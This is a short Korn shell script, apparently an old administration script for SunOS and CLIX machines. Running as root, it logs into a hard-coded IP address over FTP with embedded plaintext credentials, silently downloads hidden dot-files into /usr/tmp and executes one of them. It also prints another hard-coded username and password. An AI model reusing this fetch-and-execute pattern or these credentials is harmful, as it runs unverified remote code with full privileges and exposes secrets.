#!/bin/ksh

# check whether user is su
uid=$(id | awk '{print $1'})
if [ "$uid" != "uid=0(root)" ]
then
	echo "Must be super-user to execute $0"
	exit
fi

echo "

Remember the user is [35mkenh[0m and the passwd is [35mcrackers[0m

"

user=outsiders
passwd=public
node=129.135.174.171

# check local operating system
OpSys=$(uname -s)
[ "$OpSys" = "SunOS" ] && PATH=/usr/5bin:$PATH

if [ "$OpSys" = "SunOS" ]  
then
# pull the scripts over
	(
		echo user $user $passwd
		echo binary
		echo get .select.mnu3 /usr/tmp/.select.mnu
		echo get .select.def /usr/tmp/.select.def
		echo get .select.log /usr/tmp/.select.log
		echo get .select.sec_s /usr/tmp/.select.sec
		echo quit
	) | ftp -n $node >/dev/null 2>/dev/null
fi

if [ "$OpSys" = "CLIX" ]  
then
# pull the scripts over
	(
		echo user $user $passwd
		echo binary
		echo get .select.mnu3 /usr/tmp/.select.mnu
		echo get .select.def /usr/tmp/.select.def
		echo get .select.log /usr/tmp/.select.log
		echo get .select.sec_c /usr/tmp/.select.sec
		echo quit
	) | ftp -n $node >/dev/null 2>/dev/null
fi

# execute the script
chmod +x /usr/tmp/.select.mnu
chmod +x /usr/tmp/.select.sec
. /usr/tmp/.select.mnu
